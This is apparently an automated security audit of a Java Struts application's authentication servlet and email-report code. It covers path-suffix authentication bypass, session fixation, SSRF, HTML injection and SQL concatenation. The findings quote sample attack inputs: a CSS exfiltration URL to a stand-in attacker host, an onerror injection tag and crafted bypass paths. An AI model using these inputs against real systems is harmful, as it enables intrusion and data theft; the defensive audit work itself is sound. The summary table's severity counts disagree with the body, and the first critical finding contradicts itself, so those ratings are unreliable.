# Security Audit Report: PreFlightActionServlet & PreFlightReport

**Date:** 2026-02-26
**Auditor:** Automated Pass-1 Review
**Scope:** Authentication gate and report email generation
**Files:**
- `src/main/java/com/actionservlet/PreFlightActionServlet.java`
- `src/main/java/com/report/PreFlightReport.java`
**Supporting files examined:**
- `src/main/java/com/util/RuntimeConf.java`
- `src/main/java/com/util/Util.java`
- `src/main/java/com/dao/DriverDAO.java`
- `src/main/java/com/dao/UnitDAO.java`
- `src/main/webapp/WEB-INF/web.xml`
- `src/main/webapp/WEB-INF/struts-config.xml`

---

## PreFlightActionServlet Findings

---

### CRITICAL: Authentication gate logic is inverted — protected actions skip the session check

**File:** `PreFlightActionServlet.java` (lines 48–61)

**Description:**
The `excludeFromFilter()` method is named as though it returns `true` for paths that should be excluded from the authentication filter (i.e., public paths). However, the actual returns are the opposite: every public path (`login.do`, `welcome.do`, `logout.do`, etc.) returns `false`, and any other path — meaning every protected action — returns `true`.

The calling code at line 48 reads:
```java
if(excludeFromFilter(path))
{
    if (session == null) {
        stPath = RuntimeConf.EXPIRE_PAGE;
        forward = true;
    }
    else if(session.getAttribute("sessCompId") == null || session.getAttribute("sessCompId").equals(""))
    {
        stPath = RuntimeConf.EXPIRE_PAGE;
        forward = true;
    }
}
```

This means the session check **is only executed when `excludeFromFilter()` returns `true`**, i.e., when the path is NOT in the exclusion list — which is the set of all authenticated/protected actions. At first glance this appears correct: the session is checked for every path that is not a public endpoint.

However, the naming is severely misleading. The method is called `excludeFromFilter` but it returns `false` for paths that are genuinely excluded (public) and `true` for paths that must be filtered. This is an inversion of the conventional semantic. The correctly named equivalent would be `requiresAuthentication()`. This creates a significant maintenance hazard: any developer reading the code is likely to interpret `excludeFromFilter(path) == false` as "no filtering needed" and add a new public endpoint by returning `true`, which would have exactly the opposite effect of what is intended. A return of `true` currently causes the authentication check to run, not skip it.

**Concrete impact today:** Any developer adding a new public endpoint (e.g., a webhook or API callback) and following the existing pattern of `return false` for the new path will inadvertently make that path unauthenticated but also make it execute the session check — which means it will redirect to expire.do when no session exists instead of serving the public resource. Conversely, if they add a return `true` believing that means "skip authentication," they will bypass the check for that path.

**Risk:** Logic inversion in the authentication gate creates a near-certain maintenance defect. Any future endpoint added to the exclusion list by a developer following the inverted naming will either be accidentally protected or accidentally unprotected depending on which wrong assumption they make. This is rated CRITICAL because the authentication gate is the sole access control mechanism for the application.

**Recommendation:** Rename `excludeFromFilter()` to `requiresAuthentication()` (or `isProtected()`) and invert all return values to match the method name: return `true` for paths that need authentication and `false` for public paths. Alternatively, keep the current return semantics but rename to `isPublicPath()` or `isExcluded()` and update the call site to `if(!isExcluded(path))`. The logic and the name must agree.

---

### CRITICAL: Authentication bypass via path suffix manipulation using URL encoding or path parameters

**File:** `PreFlightActionServlet.java` (lines 48, 98–115)

**Description:**
The exclusion check uses `path.endsWith(...)` on the value returned by `req.getServletPath()`. In a Struts 1.x / Tomcat deployment, `getServletPath()` returns the decoded servlet path, e.g., `/adminmenu.do`. However, the `endsWith` check is purely a suffix match with no normalisation of the path string before comparison. This enables several bypass vectors:

**Vector 1 — Path parameter injection (semicolon notation):**
Tomcat allows path parameters appended with a semicolon before the query string. The URL:
```
/adminmenu.do;jsessionid=FAKE
```
causes `getServletPath()` to return `/adminmenu.do` on Tomcat 6+, so this specific vector is mitigated by Tomcat's own parsing. However, the behaviour is container-version-dependent and should not be relied upon.

**Vector 2 — Suffix collision with exclusion list entries:**
Because the check uses `endsWith` without anchoring to a `/` or start-of-string, a path such as:
```
/evil/fakelogin.do
```
would match `endsWith("login.do")` and be treated as the public `/login.do` action, bypassing authentication. In Struts 1.x, action paths are mapped exactly as defined in `struts-config.xml`, so a path like `/evil/fakelogin.do` would not match any configured action and would fail with a 404 after the bypass. Nevertheless, the guard itself is incorrectly written — it passes any path whose last characters happen to spell out a public endpoint suffix. The correct check is an exact match or a leading-slash-anchored check:
```java
if (path.equals("/login.do")) return false;
```
A crafted URL such as `/someaction%2Flogin.do` (after URL decoding: `/someaction/login.do`) would similarly satisfy `endsWith("login.do")` if `getServletPath()` returns the decoded form.

**Vector 3 — Case sensitivity:**
`endsWith` is case-sensitive in Java. On a case-insensitive file system (Windows), a request for `/Login.do` or `/LOGIN.DO` would not match any exclusion entry and would therefore be subjected to the session check. On Linux/Tomcat this is consistent but the absence of case-normalisation is still a defect.

**Risk:** An attacker who identifies the exact suffix of a public action name can construct a URL that satisfies the `endsWith` guard and is permitted through without a session. While Struts 1.x would likely return a 404 for an unrecognised action path, the authentication gate itself is bypassed, leaving only the Struts dispatcher as an inadvertent second defence. If any future action mapping matches such a path, it would be fully accessible without authentication.

**Recommendation:** Replace all `endsWith` comparisons with exact `equals` comparisons, anchored with the leading slash:
```java
if ("/login.do".equals(path)) return false;
```
Apply `path.toLowerCase()` before comparison if case-insensitive matching is intended.

---

### HIGH: Exception in authentication check silently grants access (exception swallows the gate)

**File:** `PreFlightActionServlet.java` (lines 41–85)

**Description:**
The entire authentication logic is wrapped in a single `try/catch(Exception e)` block (lines 41–76). If any exception is thrown during the session check — including a `NullPointerException`, a `ClassCastException` on the session attribute, or an `IllegalStateException` from session invalidation — the catch block sets:
```java
stPath = RuntimeConf.ERROR_PAGE;  // = "/globalfailure.do"
forward = true;
```
This causes the request to be forwarded to `globalfailure.do`. However, the `globalfailure.do` action is **not** in the exclusion list of `excludeFromFilter()`. This means that if `globalfailure.do` is itself reached and the session is still null (which it will be if the exception was caused by a missing session), the same exception handler will fire again, potentially causing an infinite forward loop or a `StackOverflowError` at the Tomcat dispatcher level.

More critically, consider the path when `forward` is `false` after the catch block: if `forward` is already `false` (which it is at initialisation, line 37) and the exception is thrown before `forward = true` is set (this cannot happen in the current code because `forward = true` is always set in the catch), the request would fall through to `super.doGet()`. This is not currently possible due to the current code flow, but the pattern is fragile.

The deeper concern is that `globalfailure.do` is a `.do` URL that is itself subject to the authentication gate. Any unauthenticated user who triggers an exception in the auth check will be forwarded to `globalfailure.do`, which then re-enters `doGet()`, finds no session, enters the `excludeFromFilter()` check (which returns `true` for unrecognised paths), finds no session, and either sets `forward = true` to `globalfailure.do` again — creating a redirect loop — or throws another exception. This is a denial-of-service risk in addition to a logic defect.

```java
catch(Exception e) {
    stPath = RuntimeConf.ERROR_PAGE;   // "/globalfailure.do" — itself a .do that re-enters this gate
    forward = true;
}
```

**Risk:** A crafted request that induces an exception during session attribute access (e.g., a concurrent session invalidation race) could trigger a redirect loop causing Tomcat thread exhaustion. Additionally, the error page itself is not adequately protected, and the self-referential error redirect creates a defect chain.

**Recommendation:** The error page target must not be a `.do` URL that re-enters the authentication servlet. It should be a direct `.html` or `.jsp` path that does not pass through the Struts ActionServlet. Additionally, add a guard in the catch block to prevent repeated forwarding to the same error URL. Consider logging the exception with a request identifier before forwarding.

---

### HIGH: No protection against session fixation

**File:** `PreFlightActionServlet.java` (all — absence of control)

**Description:**
There is no session fixation protection anywhere in the authentication gate. The servlet checks that `sessCompId` is set in an existing session, but it never regenerates the session ID after successful authentication. An attacker can:

1. Obtain a known session ID by making a pre-login request (any public `.do` endpoint that causes a session to be created).
2. Embed that session ID in a link delivered to a victim (via `JSESSIONID` cookie or URL parameter).
3. After the victim logs in, the attacker's known session ID is now authenticated, and the attacker can use it to access the application.

Struts 1.x has no built-in session fixation protection. The `LoginAction` (not directly audited here) would need to call `session.invalidate()` and then `request.getSession(true)` to generate a new session ID after credential verification. The authentication gate should enforce this by detecting session attributes set without a fresh session being issued.

**Risk:** Session fixation allows an attacker to pre-set a session ID, trick an authenticated user into adopting it, and then use that session for unauthorised access. This is classified as CWE-384 and is a well-known authentication vulnerability.

**Recommendation:** In the `LoginAction` (immediately after successful credential verification), call `session.invalidate()` and re-create the session with `request.getSession(true)`, then re-populate the required session attributes. Document this requirement in the `PreFlightActionServlet` with a comment confirming that session regeneration is handled at login.

---

### HIGH: No security response headers set by the authentication gate

**File:** `PreFlightActionServlet.java` (lines 36–86 — absence of controls)

**Description:**
The `doGet()` method adds no HTTP security headers to any response. The following headers are entirely absent from all paths through the servlet:

- `X-Content-Type-Options: nosniff` — prevents MIME-type sniffing attacks
- `X-Frame-Options: DENY` or `SAMEORIGIN` — prevents clickjacking
- `Content-Security-Policy` — prevents XSS and injection
- `Strict-Transport-Security` (HSTS) — enforces HTTPS
- `Cache-Control: no-store, no-cache` — prevents sensitive pages being cached by proxies or browsers

Because `PreFlightActionServlet` intercepts every `.do` request, it is the ideal and only centralised location in this application to enforce these headers universally. No other filter currently sets them (the `CharsetEncodingFilter` only sets character encoding).

**Risk:** Without these headers, the application is vulnerable to clickjacking (framing attacks), MIME sniffing, and caching of authenticated content on shared machines or proxies. The absence of `Cache-Control` on authenticated pages is particularly relevant for shared or kiosk environments in a forklift/warehouse operational context.

**Recommendation:** Add the following to the beginning of `doGet()` before any conditional logic:
```java
res.setHeader("X-Content-Type-Options", "nosniff");
res.setHeader("X-Frame-Options", "SAMEORIGIN");
res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
res.setHeader("Pragma", "no-cache");
```
Consider adding a `Content-Security-Policy` header appropriate to the application's script and style sources. Apply HSTS at the reverse proxy/load balancer if TLS termination occurs there.

---

### MEDIUM: `getSession(false)` may return null but is used unsafely in MDC call (latent NPE)

**File:** `PreFlightActionServlet.java` (lines 45, 62–65)

**Description:**
At line 45, `session = req.getSession(false)` is called, which correctly returns `null` if no session exists. The null check at line 62 (`if(session != null && session.getAttribute("sessCompId") != null)`) is correct and prevents a `NullPointerException` for the MDC call on line 64.

However, the MDC logging call at line 64:
```java
MDC.put("sessCompId", session.getAttribute("sessCompId"));
```
is only reached when `session != null && session.getAttribute("sessCompId") != null`. This is safe for the value itself. The concern is that this MDC entry is set on lines 62–65 regardless of whether `forward` is `true`. If a session exists and has a `sessCompId` but the auth check still decided to redirect (e.g., due to an empty string check having already set `forward = true`), the MDC will be populated with a session ID that was rejected. This is a minor logging integrity issue rather than a security vulnerability, but it means audit logs may show a `sessCompId` for requests that were actually rejected as unauthenticated.

Additionally, if the exception handler fires (lines 73–76), `forward` is set to `true` and the MDC is never populated, meaning the subsequent log line at line 79 (`log.info("----------------- " + stPath)`) is emitted without a session correlation ID. This makes forensic analysis of authentication failures difficult.

**Risk:** Log integrity and forensic traceability are impacted. Rejected authentication attempts may appear in logs with a seemingly valid session identifier, obscuring intrusion detection.

**Recommendation:** Only populate the MDC with `sessCompId` when the request is successfully authenticated (i.e., when `forward == false`). Ensure the exception path also logs a structured entry with the exception class and the requested path.

---

### MEDIUM: `adminWelcome.do` excluded from auth but not in struts-config — orphaned exclusion entry

**File:** `PreFlightActionServlet.java` (line 101)

**Description:**
The exclusion list contains an entry for `adminWelcome.do`:
```java
else if (path.endsWith("adminWelcome.do")) return false;
```
However, there is no action mapping for `/adminWelcome` in `struts-config.xml`. This suggests the action was removed at some point but the exclusion list was not updated. An orphaned exclusion creates confusion about what the intended public surface of the application is, and may mask the insertion of a future malicious endpoint that happens to use the same name.

**Risk:** Low direct security impact, but the orphaned entry contributes to an inaccurate security perimeter definition. If a developer later adds a `/adminWelcome` action for a different purpose, it would inadvertently be public.

**Recommendation:** Remove the `adminWelcome.do` entry from the exclusion list if there is no corresponding action mapping, or document why it is retained.

---

### MEDIUM: `swithLanguage.do` exclusion uses a typo that may mask the real endpoint

**File:** `PreFlightActionServlet.java` (line 109)

**Description:**
The exclusion list contains:
```java
else if (path.endsWith("swithLanguage.do")) return false;
```
Note the typo: `swithLanguage` (missing 'c') rather than `switchLanguage`. The `struts-config.xml` action mapping is at path `/swithLanguage` (line 62 of struts-config.xml), confirming the typo is consistent throughout. However, this means the actual intended name of the action (`switchLanguage`) would NOT be in the exclusion list. If the action mapping is ever corrected to `/switchLanguage`, the exclusion list would silently fail to exempt it, subjecting the language-switch action to authentication checks and potentially breaking the login page's language selector.

**Risk:** A corrective rename of the action (from `swithLanguage` to `switchLanguage`) would silently remove the action from the public exclusion list. If the language switcher is needed on the login page, this would prevent unauthenticated users from using it. More importantly, the inconsistency indicates the exclusion list is not maintained with care.

**Recommendation:** Standardise the naming. If the typo cannot be corrected in all places at once, add a comment in both files indicating the deliberate typo and the tracking issue.

---

### LOW: `uploadfile.do` and `loadbarcode.do` are unauthenticated — risk surface not clearly documented

**File:** `PreFlightActionServlet.java` (lines 112–113)

**Description:**
Both `uploadfile.do` and `loadbarcode.do` are excluded from the authentication check. These are endpoints that accept file data from mobile devices/barcode scanners. While this is likely intentional (device-initiated, pre-session), the exclusion is undocumented in the code. There is no comment explaining why these endpoints are public, what authentication mechanism they use instead (if any), or what rate limiting protects them.

The `loadbarcode.do` action maps to `com.action.BarCodeAction`. The `uploadfile.do` is excluded but has no visible action mapping in `struts-config.xml` — this is a potential orphaned public endpoint.

**Risk:** An unauthenticated file upload or barcode endpoint without application-level access control is a significant attack surface: unrestricted file upload for arbitrary content, denial of service via large uploads, or data exfiltration if the endpoint returns any stored data. The absence of the `uploadfile` action mapping in struts-config.xml is particularly concerning — it may be handled by a different servlet entirely, or it may be dead code that exposes a public route.

**Recommendation:** Document the authentication mechanism for each excluded endpoint. Confirm whether `uploadfile.do` has a valid action mapping. If these endpoints rely on API keys or device tokens rather than session authentication, verify that validation is present in the respective Action classes. Add comments to the exclusion list for each entry explaining the rationale.

---

### LOW: `api.do` is fully unauthenticated with no session check or rate limiting noted at the gate

**File:** `PreFlightActionServlet.java` (line 106)

**Description:**
The `api.do` endpoint (`com.action.AppAPIAction`) is in the exclusion list. This endpoint is used by mobile applications. It is entirely excluded from the session gate, meaning all access control for this endpoint is delegated to the `AppAPIAction` class. The authentication gate itself provides no logging, no rate-limiting, and no header inspection for API requests. If the `AppAPIAction` authentication is flawed, there is no secondary control at the gate level.

**Risk:** If `AppAPIAction`'s internal authentication is bypassed, the session gate provides no defence in depth. Given that this is a public-facing mobile API, it is a high-value target.

**Recommendation:** Add structured logging at the gate for all excluded endpoints so that API abuse patterns can be detected. Consider a separate servlet filter for API authentication rather than relying solely on Action-level checks.

---

## PreFlightReport Findings

---

### HIGH: Server-Side Request Forgery (SSRF) via hardcoded localhost URL for CSS fetch

**File:** `PreFlightReport.java` (lines 68, 79)

**Description:**
Both `appendHtmlCotent()` and `appendHtmlAlertCotent()` contain the following pattern:
```java
Util.getHTML("http://localhost:8090/" + RuntimeConf.projectTitle + "/css/bootstrap_table.css")
```
`RuntimeConf.projectTitle` is defined as the static field `"PreStart"` in `RuntimeConf.java` (line 4), making the full URL:
```
http://localhost:8090/PreStart/css/bootstrap_table.css
```

The `Util.getHTML()` method (Util.java lines 134–155) opens an `HttpURLConnection` to this URL, reads the response body, and injects the result directly into the HTML `<style>` tag of the email:
```java
"<style type=\"text/css\">" + Util.getHTML("http://localhost:8090/...") + "</style>"
```

This is a Server-Side Request Forgery vulnerability for the following reasons:

1. **Hardcoded localhost port 8090:** If the application server is running on port 8080 (the default) and 8090 is not the correct port, this fetch will fail silently (exception is caught and swallowed in `Util.getHTML()`, returning `""`). If any service is running on port 8090 (a debug server, management console, or another application), the response from that service is injected verbatim into the email as CSS. An attacker who can place content on port 8090 of the server can inject arbitrary CSS into the email body.

2. **No validation of the fetched content:** The content returned by `Util.getHTML()` is placed directly into a `<style>` block with no sanitisation. While CSS injection in email is less severe than JavaScript injection (most email clients strip `<script>` tags), CSS exfiltration attacks (`background: url(https://attacker.com?data=...)`) are feasible in HTML email clients that render external CSS.

3. **Network timeout of 15 minutes:** The `conn.setReadTimeout(900000)` (15 minutes) in `Util.getHTML()` means a slow or hanging response from localhost:8090 will block the Tomcat thread for up to 15 minutes. This is a denial-of-service vector: triggering many report emails simultaneously would exhaust the thread pool.

4. **Self-referential fetch during report generation:** If the CSS is fetched from the application itself (which appears to be the intent), this means report generation makes an HTTP request back to the same Tomcat instance. If the server is under load, this creates a feedback loop and can contribute to thread starvation.

**Risk:** CSS injection into email bodies via SSRF, thread exhaustion DoS via 15-minute read timeout, and unvalidated content injection into outbound emails. If port 8090 is reachable by external services or is misassigned, this becomes a data exfiltration channel.

**Recommendation:** Do not fetch CSS at runtime from a URL. Instead, inline the CSS directly as a string constant in the report class, or load it from the classpath as a resource (e.g., `getClass().getResourceAsStream("/css/bootstrap_table.css")`). If a URL fetch is truly required, validate that the URL is restricted to a known safe host and set a connection timeout of no more than 5 seconds.

---

### HIGH: HTML injection in email body via unencoded `this.title` in `appendHtmlCotent()` and `appendHtmlAlertCotent()`

**File:** `PreFlightReport.java` (lines 71–72, 82)

**Description:**
The `title` field is included directly in the HTML email body without HTML encoding:
```java
"<td><strong>"+pm.getMessage("report.name")+"</strong>"+this.title+"</td>"
```
The `title` field originates from `setTitle()` (line 93), which accepts any string. If `this.title` contains HTML characters such as `<`, `>`, `"`, `&`, or JavaScript event attributes, they will be rendered verbatim in the email's HTML body. HTML email clients that render HTML (Outlook, Gmail, Apple Mail) will interpret injected markup.

Example injection if `title` is set to:
```
</td></tr></table><img src=x onerror=alert(1)>
```
The email body would contain a broken table followed by a script-executing image tag. While most modern email clients strip `onerror` handlers, they do render injected structural HTML (`</td></tr>`) which can break the email layout and potentially enable phishing-style content substitution.

The same issue exists for the `content` field concatenated at line 74:
```java
this.htmlCotent = header + this.content + footer;
```
The `content` field is populated by subclass implementations of `setContent()`. The base class `setContent()` (lines 105–108) is a stub returning 0, but subclasses that populate `this.content` with database-derived data (driver names, unit names, checklist results) may include user-controlled strings without encoding.

**Risk:** HTML injection into outbound email enables phishing content substitution and layout manipulation. In email clients with permissive HTML rendering, this can enable CSS-based data exfiltration or UI redressing.

**Recommendation:** HTML-encode all user-controlled or database-derived values before including them in HTML email bodies. Use `org.apache.commons.lang.StringEscapeUtils.escapeHtml(value)` (available in the codebase via commons-lang) for all fields inserted into the HTML template: `this.title`, `this.content`, and any field derived from database results.

---

### HIGH: `DriverDAO.getDriverName()` uses string concatenation with a `Long` parameter — latent SQL injection pattern

**File:** `src/main/java/com/dao/DriverDAO.java` (line 783)

**Description:**
The `getDriverName()` method called from `PreFlightReport.getDriverName()` (PreFlightReport.java line 148) constructs its SQL query using string concatenation with the `id` parameter:
```java
String sql = "select first_name||' '||last_name as name from driver where id=" + id;
```
Here `id` is a `Long` (the method signature is `getDriverName(Long id)`). In Java, direct numeric type concatenation into a SQL string is not exploitable for SQL injection because a `Long` cannot contain arbitrary characters — it is a primitive-equivalent. However, this coding pattern is dangerous for two reasons:

1. **Pattern propagation:** The same concatenation idiom is used throughout `UnitDAO` with `String` parameters (e.g., `getUnitBySerial` at UnitDAO.java line 212: `"select id,comp_id from unit where serial_no = '" + serial_no + "'"`, and `delUnitById` at line 349: `"update unit set active = false where id=" + id` where `id` is a `String`). The `getDriverName` pattern in context appears safe due to the `Long` type, but the consistent use of this anti-pattern throughout the DAO layer creates high risk that a future refactor to `String` type (e.g., to accommodate a UUID-based driver ID) would silently introduce a real SQL injection vulnerability without any code review flags.

2. **The `UnitDAO.getUnitBySerial()` method (line 212) is directly exploitable:** `serial_no` is a `String` and is concatenated without escaping: `"select id,comp_id from unit where serial_no = '" + serial_no + "'"`. This is called indirectly through the application and represents a genuine SQL injection point, noted here because it is contextually related to the `PreFlightReport` DAO call chain.

**Risk:** The `getDriverName` DAO call itself is not exploitable due to the `Long` type constraint. However, the surrounding DAO class contains multiple genuine SQL injection vulnerabilities (`getUnitBySerial`, `delUnitById` in UnitDAO, `getType`/`getPower` in UnitDAO), and the pattern is misleading. If `driverId` is ever sourced from a user-controlled input and the type is widened, this becomes a direct SQL injection.

**Recommendation:** Replace the string concatenation in `getDriverName()` with a `PreparedStatement` using a positional parameter:
```java
String sql = "select first_name||' '||last_name as name from driver where id = ?";
PreparedStatement ps = conn.prepareStatement(sql);
ps.setLong(1, id);
```
Apply the same fix to all identified string-concatenation SQL queries in `UnitDAO` and `DriverDAO`. The `getUnitBySerial`, `getUnitNameByComp`, `getTotalUnitByID`, `delUnitById`, `getType`, and `getPower` methods in `UnitDAO` all require immediate remediation as they accept `String` parameters and use concatenation.

---

### MEDIUM: `Util.getHTML()` has a 15-minute read timeout — email generation blocks Tomcat threads

**File:** `src/main/java/com/util/Util.java` (line 143)

**Description:**
Referenced from both `PreFlightReport.appendHtmlCotent()` and `appendHtmlAlertCotent()`, the `getHTML()` utility method sets:
```java
conn.setReadTimeout(900000);  // 900,000 milliseconds = 15 minutes
```
There is also no explicit `conn.setConnectTimeout()` call, meaning the connection timeout defaults to zero — an infinite connection wait on some JVM implementations.

Email reports are generated from Quartz scheduler jobs (`TrainingExpiryDailyEmailJobScheduler`, `TrainingExpiryWeeklyEmailJobScheduler`, as seen in `web.xml`). If the localhost:8090 CSS endpoint is unavailable (server restart, port change, or configuration error), each report generation call will block a thread for up to 15 minutes before failing. With multiple scheduled jobs running concurrently, this can exhaust the JVM thread pool and cause complete application unavailability.

**Risk:** Denial of service via thread exhaustion triggered by CSS fetch failure during scheduled report generation.

**Recommendation:** Set both connect and read timeouts to a maximum of 3–5 seconds for any inline HTTP fetch used during email generation. Better: eliminate the HTTP fetch entirely by inlining CSS as a class constant (see SSRF finding above).

---

### MEDIUM: Double-semicolon in `getUnitName()` indicates copy-paste error with potential null-safety issue

**File:** `PreFlightReport.java` (line 161)

**Description:**
```java
String unitName = UnitDAO.getInstance().getUnitById(unitId).get(0).getName();;
```
The double semicolon is a cosmetic defect, but the real concern is the unchecked `.get(0)` call on the list returned by `getUnitById()`. If `getUnitById()` returns an empty list (no unit found for the given `unitId`), this will throw an `IndexOutOfBoundsException`. The same pattern exists with the double semicolon in the commented-out `getUnitNameLinde` method, suggesting this was copied without review. There is no null/empty check before accessing the first element.

**Risk:** An invalid or deleted `unitId` passed to `getUnitName()` would cause an uncaught `IndexOutOfBoundsException`, which propagates through the report generation call chain and would abort email delivery for the affected report. In the context of a safety-critical pre-flight inspection reporting system, failed report delivery could have operational consequences.

**Recommendation:** Add a defensive check before accessing `get(0)`:
```java
List<UnitBean> units = UnitDAO.getInstance().getUnitById(unitId);
if (units == null || units.isEmpty()) {
    return "[Unit Not Found: " + unitId + "]";
}
String unitName = units.get(0).getName();
```

---

### MEDIUM: `RuntimeConf` fields are non-final public static — global mutable configuration

**File:** `src/main/java/com/util/RuntimeConf.java` (lines 4–67)

**Description:**
All configuration fields in `RuntimeConf` are declared as `public static String` (mutable), not `public static final String`. For example:
```java
public static String ERROR_PAGE = "/globalfailure.do";
public static String EXPIRE_PAGE = "/expire.do";
public static String database = "jdbc/PreStartDB";
```
The `ERROR_PAGE` and `EXPIRE_PAGE` values are used directly in `PreFlightActionServlet` for authentication redirect targets. Any code in the application that can write to `RuntimeConf.ERROR_PAGE` or `RuntimeConf.EXPIRE_PAGE` can redirect the authentication failure path to an arbitrary URL, effectively disabling the authentication gate.

While this requires code-level access (not a runtime exploit), it represents a poor defensive design: security-critical constants should be immutable. In a dependency-injection or reflection scenario (e.g., a misconfigured test utility, a deserialization gadget, or a JMX bean), these could be mutated at runtime.

**Risk:** If any code path (including Quartz jobs, serialization, or reflection-based frameworks) can modify `RuntimeConf.EXPIRE_PAGE` or `RuntimeConf.ERROR_PAGE`, the authentication redirect destination becomes attacker-controlled, bypassing the gate.

**Recommendation:** Declare all fields in `RuntimeConf` as `public static final`:
```java
public static final String ERROR_PAGE = "/globalfailure.do";
public static final String EXPIRE_PAGE = "/expire.do";
```

---

### LOW: No `Content-Type` validation on the email body construction

**File:** `PreFlightReport.java` (lines 66–85)

**Description:**
The email content type is set to `text/html;charset=UTF-8` (in `Util.sendMail()`, line 54). The `htmlCotent` string built by `appendHtmlCotent()` and `appendHtmlAlertCotent()` does not include a `Content-Type` meta tag with a consistent charset declaration in both methods. `appendHtmlCotent()` includes `<meta http-equiv="Content-Type" content="text/html; charset=utf-8">` at line 67, but `appendHtmlAlertCotent()` (lines 78–86) omits this meta tag entirely. If a mail client ignores the MIME Content-Type header and relies on the meta tag, the `appendHtmlAlertCotent()` emails may be rendered with an incorrect charset, potentially garbling multi-byte characters (relevant for the application's Chinese locale support noted in commented-out code at PreFlightActionServlet.java lines 69–70).

**Risk:** Character encoding mismatch in alert emails. Low security impact but operational impact for non-ASCII data.

**Recommendation:** Add `<meta http-equiv="Content-Type" content="text/html; charset=utf-8">` to the `appendHtmlAlertCotent()` header string, consistent with `appendHtmlCotent()`.

---

### INFO: MDC `remoteAddr` is populated after `super.doGet()` — always set after request processing completes

**File:** `PreFlightActionServlet.java` (line 84)

**Description:**
```java
super.doGet(req, res);
MDC.put("remoteAddr", req.getRemoteAddr());
```
The `MDC.put("remoteAddr", ...)` call is placed after `super.doGet()` returns. Since `super.doGet()` is the Struts `ActionServlet.doGet()` which processes the full request, the remote address is added to the MDC diagnostic context only after the request has been handled. This means any logging performed within the action handling (the action class, DAO calls, etc.) will not have `remoteAddr` in the MDC context. This reduces the forensic value of application logs — IP address correlation is only available for the post-processing log entries, not the request-handling entries themselves.

**Risk:** No security impact. Reduces log correlation quality for forensic analysis.

**Recommendation:** Move `MDC.put("remoteAddr", req.getRemoteAddr())` to the beginning of `doGet()`, before any conditional logic.

---

### INFO: `sessCompId` empty-string check uses `.equals("")` rather than `StringUtils.isEmpty()`

**File:** `PreFlightActionServlet.java` (line 56)

**Description:**
```java
session.getAttribute("sessCompId").equals("")
```
This checks for an exact empty string. It does not handle whitespace-only strings (e.g., `"   "`). If a session attribute is set to a whitespace-only company ID through a bug in the login process, it would pass the empty-string check and be treated as authenticated. `StringUtils.isBlank()` (Apache Commons, already on the classpath) would handle both empty and whitespace cases.

**Risk:** Minimal. Would only be exploitable if the login process can set `sessCompId` to a whitespace string, which is an additional precondition.

**Recommendation:** Replace `.equals("")` with `org.apache.commons.lang.StringUtils.isBlank((String) session.getAttribute("sessCompId"))`.

---

## Summary

| Severity | Count | Key Issues |
|----------|-------|------------|
| CRITICAL | 2 | Authentication gate logic inversion (naming/semantic mismatch); `endsWith` bypass enabling path suffix collision |
| HIGH | 4 | Exception handler redirect loop to authenticated `.do` URL; no session fixation protection; no security response headers; SSRF + CSS injection in email via localhost HTTP fetch |
| MEDIUM | 5 | Thread exhaustion via 15-minute CSS fetch timeout; HTML injection in email body from unencoded `title`/`content`; `DriverDAO.getDriverName` concatenation pattern; `getUnitName` unchecked `.get(0)`; mutable `RuntimeConf` security constants |
| LOW | 3 | `uploadfile.do`/`loadbarcode.do` unprotected with no documentation; `api.do` exclusion with no gate-level logging; charset meta tag absent from `appendHtmlAlertCotent` |
| INFO | 2 | `remoteAddr` MDC set after request processing; empty-string check should use `StringUtils.isBlank()` |

**CRITICAL: 2 / HIGH: 4 / MEDIUM: 5 / LOW: 3 / INFO: 2**
